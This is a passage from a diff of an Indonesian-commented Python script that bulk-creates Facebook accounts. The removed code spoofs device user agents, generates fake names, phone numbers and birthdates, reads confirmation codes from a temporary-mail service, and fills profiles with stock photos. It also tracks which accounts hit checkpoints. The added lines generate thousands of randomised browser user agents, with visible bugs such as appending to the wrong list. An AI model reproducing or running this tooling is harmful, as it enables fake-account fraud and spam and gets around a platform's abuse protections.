Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)","Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)","Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)","Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)","Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)","Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 10; Note 7T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 13; SM-G9880 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; T10W2 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; CORN X55 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; PO-10034 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 11; 2209116AG Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; DroidBox Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; moto e(6) plus Build/PTAS29.401-25-3)","Dalvik/2.1.0 (Linux; U; Android 11; Motorola Defy Build/RZD31.31)","Dalvik/2.1.0 (Linux; U; Android 10; HEYOU20 Build/QKQ1.191008.001)","Dalvik/2.1.0 (Linux; U; Android 11; U55 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; px30_evb Build/OPM8.190505.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3-1)","Dalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-2-2)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-1)","Dalvik/2.1.0 (Linux; U; Android 12; A003SH Build/S2010)","Dalvik/2.1.0 (Linux; U; Android 9; VOG-L04 Build/HUAWEIVOG-L04)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G ace Build/QZKS30.Q4-40-64-14)","Dalvik/2.1.0 (Linux; U; Android 11; JAD-LX9 Build/HUAWEIJAD-L09)","Dalvik/2.1.0 (Linux; U; Android 12; V2202 Build/SP1A.210812.003_SC)","Dalvik/2.1.0 (Linux; U; Android 10.1; T99 Build/QP1A.191105.004)",]) +END
+    return ua
+rug=[]
+for nt in range(10000):
+	rr=random.randint
+	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	rx=random.randrange(1, 999)
+	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+	rug.append(xx)
+ruz=[]
+for mtc in range(10000):
+	rr=random.randint
+	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
+	rug.append(xd)
 def clear():
-#--> Waktu
-def waktu():
-    _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
-    hari_ini = ("%s%s%s"%(datetime.now().day,_bulan_,datetime.now().year))
-    return(str(hari_ini.lower()))
-
-#--> User Agent Vivo
-def random_ua_vivo():
-    a = random.randrange(110,113)
-    b = random.randrange(1000,10000)
-    c = random.randrange(10,100)
-    os_ver = random.randrange(10,13)                                                            #--> OS Version
-    dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160']) #--> Device Type
-    bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])                                       #--> Build Type
-    dv_ver = random.randrange(100000,250000)                                                    #--> Device Version
-    sd_ver = random.randrange(1,10)                                                             #--> Update Version
-    ch_ver = f'{a}.0.{b}.{c}'                                                                   #--> Chrome Version
-    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
-    return(ua)
-
-#--> User Agent Samsung
-def random_ua_samsung():
-    a = random.randrange(110,113)
-    b = random.randrange(1000,10000)
-    c = random.randrange(10,100)
-    os_ver = random.randrange(10,13)                                                            #--> OS Version
-    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B']) #--> Device Type
-    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])                       #--> Build Type
-    dv_ver = random.randrange(100000,250000)                                                    #--> Device Version
-    sd_ver = random.randrange(1,10)                                                             #--> Update Version
-    ch_ver = f'{a}.0.{b}.{c}'                                                                   #--> Chrome Version
-    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
-    return(ua)
-
-#--> User Agent Realme
-def random_ua_realme():
-    a = random.randrange(110,113)
-    b = random.randrange(1000,10000)
-    c = random.randrange(10,100)
-    os_ver = random.randrange(10,13)                                                        #--> OS Version
-    dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])   #--> Device Type
-    bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])                     #--> Build Type
-    dv_ver = random.randrange(100000,250000)                                                #--> Device Version
-    sd_ver = random.randrange(1,10)                                                         #--> Update Version
-    ch_ver = f'{a}.0.{b}.{c}'                                                               #--> Chrome Version
-    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
-    return(ua)
-
-#--> User Agent Custom
-def random_ua_custom():
-    try:
-        _file_ = uman
-        if 'Android' in str(_file_):
-            ad_ver = 'Android ' + str(re.search(r'Android\s+(\d+)', _file_).group(1))
-            os_ver = 'Android ' + str(random.randrange(10,13))
-            ua1 = _file_.replace(ad_ver,os_ver)
-        else: ua1 = _file_
-        if 'Build' in str(_file_):
-            od_ver = 'Build/' + str(re.search(r'Build/([^;]+)', _file_).group(1))
-            bl_typ = random.choice(['QP1A','PPR1','TP1A','RKQ1','SP1A','RP1A','PKQ1'])
-            dv_ver = random.randrange(100000,250000)
-            sd_ver = random.randrange(1,10)
-            nw_str = 'Build/' + str('%s.%s.00%s'%(bl_typ,dv_ver,sd_ver))
-            ua2 = ua1.replace(od_ver,nw_str)
-        else: ua2 = ua1
-        if 'Chrome' in str(_file_):
-            ch_old = 'Chrome/' + str(re.search(r'Chrome/([^ ]+)', _file_).group(1))
-            a = random.randrange(110,113)
-            b = random.randrange(1000,10000)
-            c = random.randrange(10,100)
-            ch_ver = f'{a}.0.{b}.{c}'
-            ch_new = 'Chrome/' + str(ch_ver)
-            ua3 = ua2.replace(ch_old,ch_new)
-        else: ua3 = ua2
-        return(ua3)
-    except Exception as e:
-        return('Mozilla/5.0 (Linux; Android 12; RMX2170 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]')
-
-
-#--> Convert Cookies
-def cvt(st,ran):
-    try:
-        if st == 'ok': cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(ran['sb'],ran['datr'],ran['c_user'],ran['xs'],ran['fr']))
-        elif st == 'cp': cookie = ('checkpoint=%s;datr=%s;fr=%s'%(ran['checkpoint'],ran['datr'],ran['fr']))
-    except Exception as e : cookie = '; '.join([str(x)+"="+str(y) for x,y in ran])
-    return(str(cookie))
-
-#--> Logo
-def logo():
-    print('%s_________                      __        %s________________ %s'%(P,M,P))
-    print('%s\_   ___ \_______ ____ _____ _/  |_  ____%s\_   ____|___   \\%s'%(P,M,P))
-    print('%s/    \  \/\_  __ \ __ \\\\__  \\\\   __\/ __ \%s|    __)   |  _/%s'%(P,M,P))
-    print('%s\ %s0.1 %s\____|  | \/ ___/ / __ \|  | \  ___/%s|   \  |   |   \\%s'%(P,M,P,M,P))
-    print('%s \________/|__|  \_____>______/__|  \____>%s|___/  |_______/%s'%(P,M,P))
-    print('%s\n      â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ %sâ€¢ %sRan_Arraya %sâ€¢ %sâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n%s'%(A,M,P,M,A,P))
-
-#--> Main Menu
-class menu:
-    def __init__(self):
-        logo()
-        self.main_menu()
-    def main_menu(self):
-        print('%s[%s1%s] %sCreate Account'%(M,P,M,P))
-        print('%s[%s2%s] %sCheck Result'%(M,P,M,P))
-        print('%s[%s3%s] %sSettings'%(M,P,M,P))
-        print('%s[%s4%s] %sBot'%(M,P,M,P))
-        x = input(' %sâ””â”€ %sPilih %s: %s'%(M,P,M,P)).lower()
-        print('')
-        if   x in ['1','01','001','a']: menu_create()
-        elif x in ['2','02','002','b']: menu_check()
-        elif x in ['3','03','003','c']: belum_tersedia()
-        elif x in ['4','04','004','d']: belum_tersedia()
-        else: exit('%sIsi Yang Benar!%s'%(M,P))
-
-#--> Menu Create
-class menu_create:
-    def __init__(self):
-        global kelamin, update, tampil, useragent, uman, passtat, password
-        try:os.mkdir('Akun_New')
-        except Exception as e :pass
-        kelamin   = input('%s[%sâ€¢%s] %sAkun Laki/Perempuan/Random [%sl%s/%sp%s/%sr%s] : '%(M,P,M,P,H,P,H,P,M,P)).lower()
-        update    = input('%s[%sâ€¢%s] %sAuto Update Info Akun [%sy%s/%st%s] : '%(M,P,M,P,H,P,M,P)).lower()
-        tampil    = input('%s[%sâ€¢%s] %sTampilkan Akun CP [%sy%s/%st%s] : '%(M,P,M,P,M,P,H,P)).lower()
-        useragent = input('%s[%sâ€¢%s] %sUser Agent Vivo/Samsung/Realme/Manual [v/s/r/m] : '%(M,P,M,P)).lower()
-        if useragent in ['m','manual','0','00']:
-            uman = input(' %sâ””â”€ %sUser Agent : %s'%(M,P,M))
-            if uman == '' or uman == ' ':
-                exit('%sIsi Yang Benar!%s'%(M,P))
-        else:
-            uman = 'Mozilla/5.0 (Linux; Android 12; RMX2170 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]'
-        passtat   = input('%s[%sâ€¢%s] %sGunakan Password Random/Manual [%sr%s/%sm%s] : '%(M,P,M,P,H,P,M,P)).lower()
-        if passtat in ['m','manual','b','2','02']:
-            password = input(' %sâ””â”€ %sPassword : %s'%(M,P,M))
-            if len(password) < 6:
-                exit('%sPassword Minimal 6 Digit!%s'%(M,P))
-            if password in ['akusayangkamu','123456','iloveyou','password','qwerty','sayang','anjing','bismillah']:
-                exit('%sGunakan Password Yang Kuat!%s'%(M,P))
-        else:
-            password = 'dapuntaloverani'
-        d = input('%s[%sâ€¢%s] %sBeri Delay (%sDalam Menit%s) : '%(M,P,M,P,M,P))
-        if d == '' or d == ' ':
-            d = 1
-        print('')
-        l = int(d)*60
-        for y in range(10000):
-            create()
-            self.hitung(l)
-    def hitung(self,a):
-        for x in range(a+1):
-            print('\r[%sOK:%s%s] [%sCP:%s%s] Tunggu %s Detik         '%(H,str(ok),P,M,str(cp),P,str(a)),end='');sys.stdout.flush()
-            a -= 1
-            time.sleep(1)
-
-#--> Create Facebook Acc
-class create:
-
-    #--> Landing
-    def __init__(self):
-        self.file  = 'Akun_New/%s.txt'%(waktu())
-        self.host  = 'mbasic.facebook.com'
-        if   useragent in ['v','vivo','1','01','a']:    ua = random_ua_vivo()
-        elif useragent in ['s','samsung','2','02','b']: ua = random_ua_samsung()
-        elif useragent in ['r','realme','3','03','c']:  ua = random_ua_realme()
-        else : ua  = random_ua_custom()
-        self.head1 = {'accept-encoding':'gzip, deflate','accept-language':'en-US,en;q=0.9','cache-control':'max-age=0','referer':f'https://{self.host}/reg/','sec-ch-ua':'','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'Android','sec-fetch-dest':'document','sec-fetch-mode':'navigate','sec-fetch-site':'same-origin','sec-fetch-user':'?1','upgrade-insecure-requests':'1','user-agent':ua}
-        self.r_nm  = requests.Session()
-        self.r_fb  = requests.Session()
-        self.r_em  = requests.Session()
-        self.r_nm.cookies.clear()
-        self.r_fb.cookies.clear()
-        self.r_em.cookies.clear()
-        self.nm, self.gd = self.get_name().split('|')
-        self.emfake      = '%s%s@gmail.com'%(self.nm.replace(' ','').lower(),str(random.randrange(1000,10000)))
-        self.em          = '%s@jollyfree.com'%(self.nm.replace(' ','').lower())
-        self.scrap1()
-
-    #--> Generate Random Name
-    def get_name(self):
-        if kelamin in ['l','laki','1','01','a']: gder = 'male'
-        elif kelamin in ['p','perempuan','2','02','b']: gder = 'female'
-        else: gder = random.choice(['male','female'])
-        try:
-            data = {'country':'indonesian','gender_type':f'{gder}','number_generate':'1','submit':'Generate'}
-            reqa = bs(self.r_nm.post('http://ninjaname.net/indonesian_name.php',data=data).content,'html.parser')
-            name = re.search('â€¢ (.*?)<br/>',str(reqa)).group(1)
-        except Exception as e:
-            nam1 = random.choice(['Eka','Dwi','Tri','Budi','Indah','Dewi'])
-            nam2 = random.choice(['Nurhayati','Handoko','Setiyani','Susanto','Permata'])
-            name = f'{nam1} {nam2}'
-        klop = f'{name}|{gder}'
-        return(klop)
-
-    #--> Generate Random Phone Number
-    def get_nope(self):
-        na   = random.choice(['12','22','52'])
-        ni   = str(random.randrange(1000,10000))
-        nu   = str(random.randrange(1000,10000))
-        nope = '+628%s%s%s'%(na,ni,nu)
-        return(nope)
-    
-    #--> Generate Random Password
-    def get_pass(self):
-        up = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-        lw = up.lower()
-        nb = '0123456789'
-        ch = up + lw + nb
-        pw = ''.join(random.choice(ch) for _ in range(12))
-        return(pw)
-    
-    #--> Generate Email
-    def cek_mail(self):
-        time.sleep(15)
-        url = f'https://tempmail.email/api/emails?inbox={self.em}'
-        req = self.r_em.get(url).json()
-        x   = re.search(r'FB-([^ ]+)',str(req)).group(1)
-        return(x)
-
-    #--> Scrap Into Login
-    def scrap1(self):
-        try:
-            cid  = str(random.randrange(100,999))
-            url1 = f'https://mbasic.facebook.com/reg/?cid={cid}&refsrc=deprecated&_rdr'
-            req1 = bs(self.r_fb.get(url1,headers=self.head1).content,'html.parser')
-            raq1 = req1.find('form',{'method':'post'})
-            if self.gd == 'male': gr = '2'              #--> Laki-Laki
-            else: gr = '1'                              #--> Perempuan
-            ttl_tgl = str(random.randrange(1,29))       #--> Tanggal Lahir
-            ttl_bln = str(random.randrange(1,13))       #--> Bulan Lahir
-            ttl_thn = str(random.randrange(1970,2001))  #--> Tahun Lahir
-            self.ttl = '%s %s %s'%(ttl_tgl,bulan[ttl_bln],ttl_thn)
-            self.nope = self.get_nope()
-            if passtat in ['m','b','2','02']: self.pw = password
-            else: self.pw = self.get_pass()
-            dat = {
-                #--> Main Data
-                'ns':re.search('name="ns" type="hidden" value="(.*?)"',str(raq1)).group(1),'ccp':re.search('name="ccp" type="hidden" value="(.*?)"',str(raq1)).group(1),'lsd':re.search('name="lsd" type="hidden" value="(.*?)"',str(raq1)).group(1),'jazoest':re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq1)).group(1),'reg_instance':re.search('name="reg_instance" type="hidden" value="(.*?)"',str(raq1)).group(1),'reg_impression_id':re.search('name="reg_impression_id" type="hidden" value="(.*?)"',str(raq1)).group(1),
-                #--> Second Data
-                'submission_request':'true','helper':'','zero_header_af_client':'','app_id':'','logger_id':'',
-                #--> Field Data
-                'field_names[]':'firstname','field_names[]':'reg_email__','field_names[]':'sex','field_names[]':'reg_passwd__',
-                #--> Input Data
-                'firstname':self.nm,'reg_email__':self.nope,'reg_passwd__':self.pw,'pass':self.pw,'sex':gr,'gender':gr,'did_use_age':False,'birthday_day':ttl_tgl,'birthday_month':ttl_bln,'birthday_year':ttl_thn,'is_birthday_confirmed':'confirmed','submit':'Daftar'}
-            cok  = '; '.join([str(x)+"="+str(y) for x,y in self.r_fb.cookies.get_dict().items()])
-            cok += perangkat
-            pos1 = self.r_fb.post(f'https://mbasic.facebook.com/reg/submit/?cid={cid}',headers=self.head1,data=dat,cookies={'cookie':cok})
-            pos2 = bs(pos1.content,'html.parser')
-            raq2 = pos2.find('form',{'method':'post'})
-            if 'checkpoint' in str(raq2['action']):
-                self.stat = 'cp'
-                self.printin()
-            else:
-                if 'save-device' in str(pos1.url):
-                    print('\rLolos Tahap 1                    ',end='');sys.stdout.flush()
-                    self.scrap2(raq2)
-        except Exception as e:
-            print('\rError Di Scrap 1')
-            print(e)
-    def scrap2(self,raq1):
-        try:
-            dat = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq1)).group(1),'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq1)).group(1),'flow' : 'interstitial_nux','next' : False,'nux_source' : 'dbl_nux_after_reg','submit' : 'OK'}
-            nek  = 'https://mbasic.facebook.com' + raq1['action']
-            cok  = '; '.join([str(x)+"="+str(y) for x,y in self.r_fb.cookies.get_dict().items()])
-            cok += perangkat
-            pos2 = self.r_fb.post(nek,headers=self.head1,data=dat,cookies={'cookie':cok})
-            pos3 = bs(pos2.content,'html.parser')
-            print('\rLolos Tahap 2                    ',end='');sys.stdout.flush()
-            self.scrap3(pos3,'1')
-        except Exception as e:
-            print('\rError Di Scrap 2')
-            print(e)
-    def scrap3(self,pos3,gui):
-        try:
-            if gui == '1':
-                nok = [x['href'] for x in pos3.find_all('a',href=True) if 'changeemail' in str(x['href'])][0]
-                nek = 'https://mbasic.facebook.com' + nok
-                cok  = '; '.join([str(x)+"="+str(y) for x,y in self.r_fb.cookies.get_dict().items()])
-                cok += perangkat
-                pes = self.r_fb.get(nek,headers=self.head1,cookies={'cookie':cok})
-                pos = bs(pes.content,'html.parser')
-                self.scrap3(pos,'2')
-            elif gui == '2':
-                raq3 = pos3.find('form',{'method':'post'})
-                dat = {'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq3)).group(1),'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq3)).group(1),'next' : False,'old_email' : re.search('name="old_email" type="hidden" value="(.*?)"',str(raq3)).group(1),'reg_instance' : re.search('name="reg_instance" type="hidden" value="(.*?)"',str(raq3)).group(1),'new' : self.emfake,'submit' : 'Add'}
-                nek = 'https://mbasic.facebook.com' + raq3['action']
-                cok = '; '.join([str(x)+"="+str(y) for x,y in self.r_fb.cookies.get_dict().items()])
-                cok += perangkat
-                pes = self.r_fb.post(nek,headers=self.head1,data=dat,cookies={'cookie':cok})
-                pos = bs(pes.content,'html.parser')
-                self.scrap3(pos,'3')
-            elif gui == '3':
-                nok = [x['href'] for x in pos3.find_all('a',href=True) if 'changeemail' in str(x['href'])][0]
-                nek = 'https://mbasic.facebook.com' + nok
-                cok  = '; '.join([str(x)+"="+str(y) for x,y in self.r_fb.cookies.get_dict().items()])
-                cok += perangkat
-                pes = self.r_fb.get(nek,headers=self.head1,cookies={'cookie':cok})
-                pos = bs(pes.content,'html.parser')
-                self.scrap3(pos,'4')
-            elif gui == '4':
-                raq3 = pos3.find('form',{'method':'post'})
-                dat = {'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq3)).group(1),'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq3)).group(1),'next' : False,'old_email' : re.search('name="old_email" type="hidden" value="(.*?)"',str(raq3)).group(1),'reg_instance' : re.search('name="reg_instance" type="hidden" value="(.*?)"',str(raq3)).group(1),'new' : self.em,'submit' : 'Add'}
-                nek = 'https://mbasic.facebook.com' + raq3['action']
-                cok = '; '.join([str(x)+"="+str(y) for x,y in self.r_fb.cookies.get_dict().items()])
-                cok += perangkat
-                pes = self.r_fb.post(nek,headers=self.head1,data=dat,cookies={'cookie':cok})
-                pos = bs(pes.content,'html.parser')
-                self.kode = self.cek_mail()
-                print('\rLolos Tahap 3                    ',end='');sys.stdout.flush()
-                self.scrap4(pos)
-        except Exception as e:
-            print('\rError Di Scrap 4')
-            print(e)
-    def scrap4(self,pos4):
-        try:
-            raq4 = pos4.find('form',{'method':'post'})
-            dat = {'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq4)).group(1),'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq4)).group(1),'c' : self.kode,'submit[confirm]' : 'Confirm'}
-            nek  = 'https://mbasic.facebook.com' + raq4['action']
-            cok  = '; '.join([str(x)+"="+str(y) for x,y in self.r_fb.cookies.get_dict().items()])
-            cok += perangkat
-            pos5 = self.r_fb.post(nek,headers=self.head1,data=dat,cookies={'cookie':cok})
-            pos6 = bs(pos5.content,'html.parser')
-            self.id = self.r_fb.cookies.get_dict()['c_user']
-            if 'Telkomsel' in str(pos6):
-                print('\rLolos Tahap 4                    ',end='');sys.stdout.flush()
-                self.scrap5(pos6)
-            else:
-                self.stat = 'ok+'
-                self.cookie = cvt('ok',self.r_fb.cookies.get_dict())
-                self.printin()
-        except Exception as e:
-            print('\rError Di Scrap 5')
-            print(e)
-    def scrap5(self,pos5):
-        try:
-            nok  = [x['href'] for x in pos5.find_all('a',href=True) if 'action=cancel' in str(x['href'])][0]
-            nek  = 'https://mbasic.facebook.com' + nok
-            cok  = '; '.join([str(x)+"="+str(y) for x,y in self.r_fb.cookies.get_dict().items()])
-            cok += perangkat
-            pos6 = bs(self.r_fb.get(nek,headers=self.head1,cookies={'cookie':cok}).content,'html.parser')
-            raq6 = pos6.find('form',{'method':'post'})
-            dat = {'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq6)).group(1),'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq6)).group(1),'submit'  : 'OK, use data'}
-            nuk  = 'https://mbasic.facebook.com' + raq6['action']
-            cok  = '; '.join([str(x)+"="+str(y) for x,y in self.r_fb.cookies.get_dict().items()])
-            cok += perangkat
-            pos7 = self.r_fb.post(nuk,headers=self.head1,data=dat,cookies={'cookie':cok})
-            print('\rLolos Tahap 5                    ',end='');sys.stdout.flush()
-            self.stat = 'ok+'
-            self.cookie = cvt('ok',self.r_fb.cookies.get_dict())
-            self.printin()
-        except Exception as e:
-            print('\rError Di Scrap 6')
-            print(e)
-    
-    #--> Print Result
-    def printin(self):
-        global cp
-        if self.stat == 'cp':
-            if tampil in ['t','2','02','b']: pass
-            else:
-                print('\r%sStatus : %sCheckpoint%s                         '%(P,M,P))
-                print('Nama   : %s'%(self.nm))
-                print('TTL    : %s'%(self.ttl))
-                print('Email  : %s'%(self.nope))
-                print('Pass   : %s'%(self.pw))
-                print('IP     : %s'%(self.ip('M')))
-                print('')
-            cp += 1
-        elif self.stat == 'ok+':
-            self.edit_profil()
-        else:
-            print('\rStatus : Coba Dulu                         ')
-            print('Nama   : %s'%(self.nm))
-            print('TTL    : %s'%(self.ttl))
-            print('Email  : %s'%(self.em))
-            print('Pass   : %s'%(self.pw))
-            print('IP     : %s'%(self.ip('M')))
-            print('')
-    
-    #--> Get IP Address
-    def ip(self,w):
-        try:
-            r = requests.Session()
-            o = r.get('https://api.ipify.org/?format=json').json()['ip']
-            if w == 'H': p = '%s%s%s'%(H,o,P)
-            else: p = '%s%s%s'%(M,o,P)
-            return(p)
-        except Exception as e:
-            return('%sUnknown%s'%(M,P))
-
-    #--> Landing Edit Profil
-    def edit_profil(self):
-        self.xyz = requests.Session()
-        if self.gd == 'male':
-            self.foto = random.choice(['https://i.pinimg.com/736x/47/cb/b4/47cbb446dd61bfb03308af7dbefdba06.jpg','https://i.pinimg.com/736x/b5/13/22/b51322eeaa2b35fac59444ebde6d8d2f.jpg','https://i.pinimg.com/736x/58/07/ba/5807ba1c263caaa5bbe0639d24ada8e2.jpg','https://i.pinimg.com/736x/72/bd/33/72bd338d114cec8922c14bd98322cf8a.jpg','https://i.pinimg.com/736x/c1/3d/21/c13d2188ceed1679fa2b8963031bc3e6.jpg'])
-        else:
-            self.foto = random.choice(['https://i.pinimg.com/736x/80/8c/97/808c97eb9c7e017964857b957c125917.jpg','https://i.pinimg.com/736x/f8/a0/da/f8a0da275c48b03550990d3cd27d4eb6.jpg','https://i.pinimg.com/736x/7b/66/55/7b66559151d8c0f50892e27175e5c1d3.jpg','https://i.pinimg.com/736x/6b/00/fe/6b00feaa363d752a4020e55437ba0308.jpg','https://i.pinimg.com/736x/44/b0/7e/44b07e3d57a24bacc0b44b3fb4333908.jpg','https://i.pinimg.com/736x/14/b4/35/14b435422805ff41ecf6688ca67fd132.jpg','https://i.pinimg.com/736x/b6/14/93/b61493683fad328b87b54836226b6eb8.jpg','https://i.pinimg.com/736x/1b/9c/fb/1b9cfbd592dcfc682a14b93698b01e1c.jpg','https://i.pinimg.com/736x/98/ff/d7/98ffd7873189fd7ec7121b4de9cccd09.jpg','https://i.pinimg.com/736x/30/cc/11/30cc11c3453294bca7d657f490e2393a.jpg'])
-        if update in ['1','01','y','a']:
-            self.profil()
-            self.cover()
-            self.bio()
-            # self.auto_follow()
-            # self.kota('https://mbasic.facebook.com/editprofile.php?type=basic&edit=hometown','hometown','hometown[]','Yogyakarta')
-            # self.kota('https://mbasic.facebook.com/editprofile.php?type=basic&edit=current_city','current_city','current_city[]','Yogyakarta')
-            # self.website()
-        self.logout()
-    
-    #--> Edit Foto Profil
-    def profil(self):
-        try:
-            fot = urllib.request.urlopen(self.foto)
-            url = 'https://mbasic.facebook.com/profile_picture/'
-            req = bs(self.xyz.get(url,cookies=self.cookie,headers=self.head1).content,'html.parser')
-            raq = req.find('form',{'method':'post'})
-            dat = {
-                'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'submit'  : 'Simpan'}
-            fil = {'pic' : fot}
-            pos = bs(self.xyz.post(raq['action'],data=dat,files=fil,cookies=self.cookie,headers=self.head1).content,'html.parser')
-        except Exception as e:
-            pass
-    
-    #--> Edit Foto Sampul
-    def cover(self):
-        try:
-            fot = urllib.request.urlopen(self.foto)
-            url = 'https://mbasic.facebook.com/photos/upload/?cover_photo'
-            req = bs(self.xyz.get(url,cookies=self.cookie,headers=self.head1).content,'html.parser')
-            raq = req.find('form',{'method':'post'})
-            dat = {
-                'fb_dtsg'                  : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'jazoest'                  : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'return_uri'               : re.search('name="return_uri" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'return_uri_error'         : re.search('name="return_uri_error" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'ref'                      : re.search('name="ref" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'csid'                     : re.search('name="csid" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'ctype'                    : re.search('name="ctype" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'profile_edit_logging_ref' : re.search('name="profile_edit_logging_ref" type="hidden" value="(.*?)"',str(raq)).group(1),
-                'submit'                   : 'Unggah'}
-            fil = {'file1' : fot}
-            pos = bs(self.xyz.post('https://mbasic.facebook.com'+raq['action'],data=dat,files=fil,cookies=self.cookie,headers=self.head1).content,'html.parser')
-        except Exception as e:
-            pass
-    
-    #--> Edit Bio
-    def bio(self):
-        try:
-            url = 'https://mbasic.facebook.com/profile/basic/intro/bio/'
